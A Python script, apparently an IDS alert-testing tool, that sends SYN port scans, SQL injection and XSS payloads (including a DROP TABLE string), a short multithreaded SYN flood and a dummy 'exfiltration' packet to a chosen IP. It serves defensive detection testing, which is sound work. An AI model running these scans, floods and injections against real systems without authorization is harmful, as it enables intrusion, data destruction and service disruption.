import threading
import time
import os
import sys
import logging
from scapy.all import IP, TCP, Raw, send
import requests
from colorama import Fore, Style, init
import argparse
from typing import List, Optional

init(autoreset=True)

# Check for root/admin
if os.name != "nt" and os.geteuid() != 0:
    print(Fore.RED + "This script must be run as root/admin for raw packet sending.")
    sys.exit(1)

# Logging config
logging.basicConfig(
    filename='test_alerts.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AlertTester:
    def __init__(self, target_ip: str = "127.0.0.1", target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.summary = []

    def start_test(self, test_type: str) -> None:
        if test_type == "all":
            self._run_all_tests()
        elif hasattr(self, f"_test_{test_type}"):
            getattr(self, f"_test_{test_type}")()
        else:
            logging.error(f"Unknown test type: {test_type}")
            print(Fore.RED + f"Unknown test type: {test_type}")

    def _run_all_tests(self) -> None:
        tests = [
            self._test_port_scan,
            self._test_sql_injection,
            self._test_xss,
            self._test_connection_flood,
            self._test_data_exfiltration
        ]
        for test in tests:
            test()
            time.sleep(2)
        self._print_summary()

    def _test_port_scan(self) -> None:
        print(Fore.YELLOW + "[*] Starting port scan...")
        logging.info("Port scan test started.")
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]
        success = 0
        for port in common_ports:
            try:
                packet = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=0)
                print(Fore.GREEN + f"   - Sent SYN to port {port}")
                logging.info(f"Port scan: SYN sent to port {port}")
                success += 1
                time.sleep(0.1)
            except Exception as e:
                print(Fore.RED + f"Error sending to port {port}: {e}")
                logging.error(f"Port scan error: {e}")
        print(Fore.CYAN + "[✓] Port scan test completed.\n")
        self.summary.append(("Port Scan", success, len(common_ports)))

    def _send_payloads(self, endpoint: str, param: str, payloads: List[str], label: str) -> None:
        success = 0
        for payload in payloads:
            try:
                url = f"http://{self.target_ip}:{self.target_port}/{endpoint}"
                requests.get(url, params={param: payload}, timeout=2)
                print(Fore.GREEN + f"   - Sent {label} payload: {payload}")
                logging.info(f"{label} payload sent: {payload}")
                success += 1
                time.sleep(0.5)
            except Exception as e:
                print(Fore.RED + f"   - Error: {e}")
                logging.error(f"{label} error: {e}")
        self.summary.append((label, success, len(payloads)))

    def _test_sql_injection(self) -> None:
        print(Fore.YELLOW + "[*] Starting SQL injection test...")
        logging.info("SQL injection test started.")
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users; --",
            "admin' --",
            "1' OR '1' = '1"
        ]
        self._send_payloads("login.php", "user", sql_payloads, "SQLi")
        print(Fore.CYAN + "[✓] SQL injection test completed.\n")

    def _test_xss(self) -> None:
        print(Fore.YELLOW + "[*] Starting XSS test...")
        logging.info("XSS test started.")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        self._send_payloads("search", "q", xss_payloads, "XSS")
        print(Fore.CYAN + "[✓] XSS test completed.\n")

    def _flood_thread(self) -> None:
        try:
            while self.running:
                packet = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="S")
                send(packet, verbose=0)
        except Exception as e:
            logging.error(f"Flood thread error: {e}")

    def _test_connection_flood(self) -> None:
        print(Fore.YELLOW + "[*] Starting connection flood (5s)...")
        logging.info("Connection flood test started.")
        self.running = True
        threads = [threading.Thread(target=self._flood_thread) for _ in range(5)]
        for t in threads:
            t.start()
        time.sleep(5)
        self.running = False
        for t in threads:
            t.join()
        print(Fore.CYAN + "[✓] Connection flood test completed.\n")
        logging.info("Connection flood test finished.")
        self.summary.append(("Connection Flood", 1, 1))

    def _test_data_exfiltration(self) -> None:
        print(Fore.YELLOW + "[*] Starting data exfiltration simulation...")
        logging.info("Data exfiltration test started.")
        try:
            large_data = "A" * 10000
            packet = IP(dst=self.target_ip)/TCP(dport=self.target_port)/Raw(load=large_data)
            send(packet, verbose=0)
            print(Fore.GREEN + "   - Sent 10KB data packet to target.")
            logging.info("Data exfiltration packet sent.")
            self.summary.append(("Data Exfiltration", 1, 1))
        except Exception as e:
            print(Fore.RED + f"   - Error: {e}")
            logging.error(f"Data exfiltration error: {e}")
            self.summary.append(("Data Exfiltration", 0, 1))
        print(Fore.CYAN + "[✓] Data exfiltration test completed.\n")

    def _print_summary(self) -> None:
        print(Fore.MAGENTA + "\nTest Summary:")
        for label, success, total in self.summary:
            print(Fore.MAGENTA + f"  {label}: {success}/{total} successful payloads/packets sent.")


def main():
    parser = argparse.ArgumentParser(description="IDS Attack Test Tool")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--test", choices=["all", "port_scan", "sql_injection", "xss", "connection_flood", "data_exfiltration"], help="Test to run")
    args = parser.parse_args()

    if args.test:
        tester = AlertTester(args.target, args.port)
        tester.start_test(args.test)
        tester._print_summary()
    else:
        # Interactive mode fallback
        print(Fore.CYAN + "ALERT TESTING TOOL")
        print(Fore.CYAN + "==================")
        print("1. Run all tests")
        print("2. Port scan")
        print("3. SQL injection")
        print("4. XSS")
        print("5. Connection flood")
        print("6. Data exfiltration")
        print("7. Exit")

        target_ip = input(Fore.WHITE + "Enter target IP (default: 127.0.0.1): ").strip() or "127.0.0.1"
        tester = AlertTester(target_ip, 80)

        while True:
            choice = input(Fore.YELLOW + "\nSelect test (1-7): ").strip()
            test_map = {
                "1": "all",
                "2": "port_scan",
                "3": "sql_injection",
                "4": "xss",
                "5": "connection_flood",
                "6": "data_exfiltration"
            }
            if choice == "7":
                print(Fore.GREEN + "Exiting.")
                break
            elif choice in test_map:
                tester.start_test(test_map[choice])
                tester._print_summary()
            else:
                print(Fore.RED + "Invalid option. Try again.")

if __name__ == "__main__":
    main()
